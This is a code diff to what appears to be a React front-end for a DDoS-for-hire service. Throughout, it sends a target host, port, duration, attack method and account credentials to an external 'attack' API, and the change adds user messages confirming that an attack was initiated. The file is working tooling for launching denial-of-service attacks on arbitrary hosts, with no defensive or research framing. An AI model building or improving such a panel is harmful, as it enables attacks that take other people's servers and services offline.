@@ -94,9 +94,21 @@
                 try {
                     const res = await fetch(`https://api.loneservices.xyz/api/attack?username=${username}&password=${password}&target=${host}&port=${port}&time=${time}&method=${method}`);
                     const data = await res.json();
-                    setResponse(data);
+
+                    if (data.success) {
+                        setResponse({
+                            success: true,
+                            message: `Attack successfully initiated using ${method.toUpperCase()} method.`,
+                            data: data
+                        });
+                    } else {
+                        setResponse({
+                            success: false,
+                            error: "Failed to send attack. Please check the parameters and try again."
+                        });
+                    }
                 } catch (error) {
-                    setResponse({ error: "Failed to fetch response" });
+                    setResponse({ error: "Failed to fetch response, please try again." });
                 }
                 setLoading(false);
             };
@@ -113,7 +125,11 @@
                         {methods.map((m, index) => (<option key={index} value={m}>{m.toUpperCase()}</option>))}
                     </select>
                     <button onClick={handleTestAPI} disabled={loading}>{loading ? "Testing..." : "Test API"}</button>
-                    {response && <pre>{JSON.stringify(response, null, 2)}</pre>}
+                    {response && 
+                        <pre>
+                            {response.success ? response.message : response.error}
+                        </pre>
+                    }
                 </div>
             );
         }
